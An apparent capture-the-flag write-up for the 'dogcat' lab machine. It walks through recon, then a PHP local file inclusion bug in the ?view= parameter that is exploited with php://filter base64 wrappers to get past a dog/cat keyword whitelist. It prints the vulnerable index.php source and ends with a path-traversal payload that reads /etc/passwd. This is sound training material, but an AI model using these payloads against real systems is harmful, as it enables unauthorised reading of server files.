# dogcat

1. Recon reveals 22 and 80.
2. Going to the site (after running a dirb) reveals a simple site where you can view dog or cat images, via a query string `?view=`. Obvious LFI challenge
3. `php://filter/dog/convert.base64-encode/resource=dog` gets the base64 encoding of the dog and cat pages, which select a random image. Unfortunately, there is a whitelist: if dog or cat are not in the view url, it rejects it with 'only dogs or cats allowed'.
4. After a lot of messing about, I found this works (I don't know why. PHP ¯\_(ツ)_/¯): `http://10.10.177.45/?view=php://filter/dog/convert.base64-encode/resource=index`. It returns an error and the base64 of index :D

    This revealed that index is:

    ```php
    <?php
        function containsStr($str, $substr) {
            return strpos($str, $substr) !== false;
        }
        $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if(isset($_GET['view'])) {
            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
            } else {
                echo 'Sorry, only dogs or cats are allowed.';
            }
        }
    ?>
    ```

    Of note, I can specify the extension. So for example this works and gets me the passwd file: `?view=php://filter/dog/convert.base64-encode/resource=../../../../etc/passwd&ext=`